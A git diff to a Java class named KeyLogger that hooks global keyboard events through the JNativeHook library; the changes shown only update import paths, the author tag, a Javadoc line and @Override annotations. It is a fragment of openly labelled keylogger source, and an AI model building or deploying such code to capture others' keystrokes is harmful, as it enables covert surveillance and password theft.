@@ -9,15 +9,17 @@ import java.nio.file.Paths;
 import java.nio.file.StandardOpenOption;
 import java.util.logging.Level;
 
-import org.jnativehook.GlobalScreen;
-import org.jnativehook.NativeHookException;
-import org.jnativehook.keyboard.NativeKeyEvent;
-import org.jnativehook.keyboard.NativeKeyListener;
+import com.github.kwhat.jnativehook.GlobalScreen;
+import com.github.kwhat.jnativehook.NativeHookException;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
+import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 /**
- * @author vakho
+ * Program to run the keylogger application with NativeHook library
+ *
+ * @author dhvakr
  */
 public class KeyLogger implements NativeKeyListener {
 
@@ -50,6 +52,7 @@ public class KeyLogger implements NativeKeyListener {
 		logger.setUseParentHandlers(false);
 	}
 
+
 	public void nativeKeyPressed(NativeKeyEvent e) {
 		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
 		
@@ -68,10 +71,12 @@ public class KeyLogger implements NativeKeyListener {
 		}
 	}
 
+	@Override
 	public void nativeKeyReleased(NativeKeyEvent e) {
 		// Nothing
 	}
 
+	@Override
 	public void nativeKeyTyped(NativeKeyEvent e) {
 		// Nothing here
 	}
